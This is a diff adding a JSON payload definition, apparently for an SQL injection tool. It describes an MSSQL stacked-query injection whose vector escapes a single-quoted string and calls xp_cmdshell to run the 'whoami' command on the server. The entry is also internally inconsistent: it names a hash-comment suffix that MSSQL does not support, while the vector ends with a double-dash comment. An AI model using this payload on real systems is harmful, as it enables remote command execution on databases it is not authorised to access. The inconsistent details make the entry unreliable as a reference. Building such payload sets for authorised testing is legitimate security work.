@@ -1,0 +1,12 @@
+{
+ "dbms": "mssql",
+ "technique": "stacked",
+ "boundary": {
+  "prefix": "'",
+  "suffix": "#",
+  "type": "single-quote",
+  "desc": "single-quoted + hash comment"
+ },
+ "vector": "{B}; EXEC xp_cmdshell('whoami')-- -",
+ "comment": "mssql stacked via single-quoted + hash comment"
+}
